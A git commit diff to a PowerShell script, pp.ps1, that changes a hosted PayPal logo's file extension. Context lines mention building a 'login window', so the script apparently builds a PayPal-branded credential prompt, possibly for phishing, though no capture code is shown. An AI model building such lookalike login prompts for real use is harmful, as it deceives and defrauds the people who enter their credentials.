5559f5daedfe129cbddae5171e069a8005f5cc6e
Wesley5n1p35 <47337218+Wesley5n1p35@users.noreply.github.com>
2023-11-10 12:15:15 -0600

    Update pp.ps1

--- pp.ps1
+++ pp.ps1
@@ -100,7 +100,7 @@ $Result = [System.Windows.MessageBox]::Show($msgBody, $msgTitle, $msgButton, $ms
 Write-Host "The user clicked: $Result"
 
 # Define the URL to the image hosted on GitHub
-$imageUrl = "https://raw.githubusercontent.com/Wesley5n1p35/psh/main/paypal.jpg"
+$imageUrl = "https://raw.githubusercontent.com/Wesley5n1p35/psh/main/paypal.png"
 
 # Create XAML for the login window without specifying the icon
 $XAML = @"
